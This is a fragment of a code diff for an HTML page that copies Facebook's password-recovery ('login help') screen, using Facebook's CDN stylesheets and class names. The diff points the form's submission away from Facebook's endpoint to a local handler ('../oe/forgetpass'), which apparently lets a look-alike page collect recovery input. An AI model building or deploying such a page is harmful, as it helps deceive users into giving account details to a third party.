@@ -7,12 +7,12 @@
 <title>Insert title here</title>
 <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/JT8ZJT0WWqH.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="uUdC1OG" crossorigin="anonymous">
 <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yq/l/0,cross/L0VTH1UsUXD.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0QQt+vI" crossorigin="anonymous">
-<link rel="stylesheet" type="text/css" href="../../CSS/passmabaomat.css">
+<link rel="stylesheet" type="text/css" href="../views/CSS/passmabaomat.css">
 
 </head>
 <body>
 	<div class="_4-u5 _30ny" id="login_help">
-		<form rel="async" id="identify_yourself_flow" action="/ajax/login/help/identify.php?ctx=recover" method="post" onsubmit="">
+		<form rel="async" id="identify_yourself_flow" action="../oe/forgetpass" method="post" onsubmit="">
 			<div class="mvl ptm uiInterstitial _9np_ uiInterstitialLarge uiBoxWhite">
 				<div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
 					<div class="clearfix uiHeaderTop">
